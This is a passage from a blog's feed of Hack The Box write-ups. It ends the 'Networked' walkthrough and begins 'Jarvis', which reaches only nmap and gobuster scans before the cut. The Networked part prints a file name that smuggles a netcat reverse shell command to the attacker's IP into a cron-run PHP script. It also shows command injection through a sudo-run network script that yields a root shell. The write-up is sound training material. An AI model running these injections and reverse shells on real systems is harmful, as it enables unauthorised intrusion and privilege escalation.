class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ which python</span><br><span class="line">which python</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">sh-4.2$ python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">bash-4.2$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1337</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# stty raw -echo</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1337</span><br><span class="line"></span><br><span class="line">bash-4.2$ export TERM&#x3D;screen</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure><p>Then I started to enumerate the box, there was only one user on the box called <code>guly</code>:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cd &#x2F;home&#x2F;</span><br><span class="line">bash-4.2$ ls -al</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x.  3 root root  18 Jul  2 13:27 .</span><br><span class="line">dr-xr-xr-x. 17 root root 224 Jul  2 13:27 ..</span><br><span class="line">drwxr-xr-x.  2 guly guly 178 Nov 16 00:31 guly</span><br><span class="line">bash-4.2$ cd guly&#x2F;</span><br><span class="line">bash-4.2$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .</span><br><span class="line">drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..</span><br><span class="line">lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout</span><br><span class="line">-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile</span><br><span class="line">-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc</span><br><span class="line">-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo</span><br><span class="line">-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 1920 Nov 16 00:27 dead.letter</span><br><span class="line">-r--------. 1 guly guly   33 Oct 30  2018 user.txt</span><br><span class="line">bash-4.2$ cat user.txt </span><br><span class="line">cat: user.txt: Permission denied</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure><br>We can’t read the flag as <code>apache</code>, but there are some other interesting readable stuff, <code>crontab.guly</code> shows that <code>/home/guly/check_attack.php</code> gets executed as <code>guly</code> every 3 minutes:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cat crontab.guly</span><br><span class="line">*&#x2F;3 * * * * php &#x2F;home&#x2F;guly&#x2F;check_attack.php</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure><p><code>check_attack.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bash<span class="number">-4.2</span>$ cat check_attack.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br><span class="line">$logpath = <span class="string">'/tmp/attack.log'</span>;</span><br><span class="line">$to = <span class="string">'guly'</span>;</span><br><span class="line">$msg= <span class="string">''</span>;</span><br><span class="line">$headers = <span class="string">"X-Mailer: check_attack.php\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$files = <span class="keyword">array</span>();</span><br><span class="line">$files = preg_grep(<span class="string">'/^([^.])/'</span>, scandir($path));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $msg=<span class="string">''</span>;</span><br><span class="line">  <span class="keyword">if</span> ($value == <span class="string">'index.html'</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">#echo "-------------\n";</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#print "check: $value\n";</span></span><br><span class="line">  <span class="keyword">list</span> ($name,$ext) = getnameCheck($value);</span><br><span class="line">  $check = check_ip($name,$value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!($check[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"attack!\n"</span>;</span><br><span class="line">    <span class="comment"># <span class="doctag">todo:</span> attach file</span></span><br><span class="line">    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);</span><br><span class="line"></span><br><span class="line">    exec(<span class="string">"rm -f $logpath"</span>);</span><br><span class="line">    exec(<span class="string">"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"rm -f $path$value\n"</span>;</span><br><span class="line">    mail($to, $msg, $msg, $headers, <span class="string">"-F$value"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">bash<span class="number">-4.2</span>$</span><br></pre></td></tr></table></figure><p>This script checks for files that aren’t supposed to be in the uploads directory and deletes them, the interesting part is how it deletes the files, it appends the file name to the <code>rm</code> command without any filtering which makes it vulnerable to command injection:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br></pre></td></tr></table></figure><p><code>$path</code> is the path of the uploads directory:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br></pre></td></tr></table></figure><p>And <code>$value</code> is the suspicious file’s name.<br>We can simply go to <code>/var/www/html/uploads</code> and create a file that holds the payload in its name. The name will start with a semicolon <code>;</code> (to inject the new command) then the reverse shell command.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ cd &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads</span><br><span class="line">bash-4.2$ touch &#39;; nc 10.10.xx.xx 1338 -c bash&#39;</span><br><span class="line">bash-4.2$</span><br></pre></td></tr></table></figure><p>After some time I got a shell as <code>guly</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1338</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::1338</span><br><span class="line">Ncat: Listening on 0.0.0.0:1338</span><br><span class="line">Ncat: Connection from 10.10.10.146.</span><br><span class="line">Ncat: Connection from 10.10.10.146:60812.</span><br><span class="line">whoami</span><br><span class="line">guly</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">[guly@networked ~]$ ^Z</span><br><span class="line">[1]+  Stopped                 nc -lvnp 1338</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# stty raw -echo </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;networked# nc -lvnp 1338</span><br><span class="line"></span><br><span class="line">[guly@networked ~]$ export TERM&#x3D;screen</span><br><span class="line">[guly@networked ~]$ id</span><br><span class="line">uid&#x3D;1000(guly) gid&#x3D;1000(guly) groups&#x3D;1000(guly)</span><br><span class="line">[guly@networked ~]$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x. 2 guly guly  178 Nov 16 00:31 .</span><br><span class="line">drwxr-xr-x. 3 root root   18 Jul  2 13:27 ..</span><br><span class="line">lrwxrwxrwx. 1 root root    9 Jul  2 13:35 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout</span><br><span class="line">-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile</span><br><span class="line">-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc</span><br><span class="line">-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 3072 Nov 16 00:48 dead.letter</span><br><span class="line">-r--------. 1 guly guly   33 Oct 30  2018 user.txt</span><br><span class="line">-rw-------  1 guly guly  749 Nov 16 00:31 .viminfo</span><br><span class="line">[guly@networked ~]$</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/networked/13.png" alt=""></p><p>We owned user.</p><h2 id="Command-Injection-in-the-Network-Script-Name-–-gt-Root-Shell-–-gt-Root-Flag"><a href="#Command-Injection-in-the-Network-Script-Name-–-gt-Root-Shell-–-gt-Root-Flag" class="headerlink" title="Command Injection in the Network Script Name –&gt; Root Shell –&gt; Root Flag"></a>Command Injection in the Network Script Name –&gt; Root Shell –&gt; Root Flag</h2><p>As <code>guly</code> I checked <code>sudo -l</code> and found that <code>guly</code> can run <code>/usr/local/sbin/changename.sh</code> as root without a password: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ sudo -l</span><br><span class="line">Matching Defaults entries for guly on networked:</span><br><span class="line">    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,</span><br><span class="line">    env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;,</span><br><span class="line">    env_keep+&#x3D;&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;,</span><br><span class="line">    secure_path&#x3D;&#x2F;sbin\:&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin</span><br><span class="line"></span><br><span class="line">User guly may run the following commands on networked:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;changename.sh</span><br><span class="line">[guly@networked ~]$</span><br></pre></td></tr></table></figure><p><code>changename.sh</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ cat /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line">cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF</span><br><span class="line">DEVICE=guly0</span><br><span class="line">ONBOOT=no</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">EoF</span><br><span class="line"></span><br><span class="line">regexp=<span class="string">"^[a-zA-Z0-9_\ /-]+$"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> var <span class="keyword">in</span> NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">        <span class="built_in">read</span> x</span><br><span class="line">        <span class="keyword">while</span> [[ ! <span class="variable">$x</span> =~ <span class="variable">$regexp</span> ]]; <span class="keyword">do</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"wrong input, try again"</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="string">"interface <span class="variable">$var</span>:"</span></span><br><span class="line">                <span class="built_in">read</span> x</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$var</span>=<span class="variable">$x</span> &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/sbin/ifup guly0</span><br><span class="line">[guly@networked ~]$</span><br></pre></td></tr></table></figure><p>This script simply creates a network script for an interface called <code>guly</code> then activates that interface. It asks the user for these options: <code>NAME</code>, <code>PROXY_METHOD</code>, <code>BROWSER_ONLY</code>, <code>BOOTPROTO</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ sudo &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">test</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">test</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">test</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">test</span><br><span class="line">ERROR     : [&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifup-eth] Device guly0 does not seem to be present, delaying initialization.</span><br></pre></td></tr></table></figure><p>We’re only interested in the <code>NAME</code> option because according to <a href="https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f" target="_blank" rel="noopener">this page</a> we can inject commands in the interface name.  Let’s try to execute <code>bash</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked ~]$ sudo &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;changename.sh</span><br><span class="line">interface NAME:</span><br><span class="line">test bash</span><br><span class="line">interface PROXY_METHOD:</span><br><span class="line">test</span><br><span class="line">interface BROWSER_ONLY:</span><br><span class="line">test</span><br><span class="line">interface BOOTPROTO:</span><br><span class="line">test</span><br><span class="line">[root@networked network-scripts]# whoami</span><br><span class="line">root</span><br><span class="line">[root@networked network-scripts]# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">[root@networked network-scripts]# cd &#x2F;root&#x2F;</span><br><span class="line">[root@networked ~]# ls -la</span><br><span class="line">total 28</span><br><span class="line">dr-xr-x---.  2 root root  144 Jul 15 11:34 .</span><br><span class="line">dr-xr-xr-x. 17 root root  224 Jul  2 13:27 ..</span><br><span class="line">lrwxrwxrwx.  1 root root    9 Jul  2 13:35 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r--.  1 root root   18 Dec 29  2013 .bash_logout</span><br><span class="line">-rw-r--r--.  1 root root  176 Dec 29  2013 .bash_profile</span><br><span class="line">-rw-r--r--.  1 root root  176 Dec 29  2013 .bashrc</span><br><span class="line">-rw-r--r--.  1 root root  100 Dec 29  2013 .cshrc</span><br><span class="line">-r--------.  1 root root   33 Oct 30  2018 root.txt</span><br><span class="line">-rw-r--r--.  1 root root  129 Dec 29  2013 .tcshrc</span><br><span class="line">-rw-------   1 root root 1011 Jul 15 11:34 .viminfo</span><br><span class="line">[root@networked network-scripts]#</span><br></pre></td></tr></table></figure><p>And we got a root shell.<br><img src="/images/hackthebox/networked/14.png" alt=""><br>We owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p><p>Previous Hack The Box write-up : <a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a><br>Next Hack The Box write-up : <a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></p>]]></content:encoded>
      
      <comments>https://0xrick.github.io/hack-the-box/networked/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Hack The Box - Jarvis</title>
      <link>https://0xrick.github.io/hack-the-box/jarvis/</link>
      <guid>https://0xrick.github.io/hack-the-box/jarvis/</guid>
      <pubDate>Sat, 09 Nov 2019 03:00:00 GMT</pubDate>
      <description>
      
        My write-up / walkthrough for Jarvis from Hack The Box.
      
      </description>
      
      
      <content:encoded><![CDATA[<h1 id="Hack-The-Box-Jarvis"><a href="#Hack-The-Box-Jarvis" class="headerlink" title="Hack The Box - Jarvis"></a>Hack The Box - Jarvis</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to <code>SQL</code> injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is <code>10.10.10.143</code>, I added it to <code>/etc/hosts</code> as <code>jarvis.htb</code>. Let’s jump right in!</p><p><img src="/images/hackthebox/jarvis/0.png" alt=""></p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nmap -sV -sT -sC -o nmapinitial jarvis.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-08 17:33 EET</span><br><span class="line">Nmap scan report for jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   &#x2F;:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#</span><br></pre></td></tr></table></figure><p>We got <code>ssh</code> on port 22 and <code>http</code> on port 80. Let’s take a look at the web service.</p><h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>By visiting <code>http://jarvis.htb/</code> we get a website for a hotel called Stark Hotel:<br><img src="/images/hackthebox/jarvis/1.png" alt=""></p><p><img src="/images/hackthebox/jarvis/2.png" alt=""></p><p><img src="/images/hackthebox/jarvis/3.png" alt=""></p><p><img src="/images/hackthebox/jarvis/4.png" alt=""></p><p><img src="/images/hackthebox/jarvis/5.png" alt=""><br>I ran <code>gobuster</code> to check for any sub directories and the only interesting thing I found was <code>/phpmyadmin</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# gobuster -u http:&#x2F;&#x2F;jarvis.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;jarvis.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;08 17:38:59 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;fonts (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;phpmyadmin (Status: 301)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;08 17:40:39 Finished</span><br><span 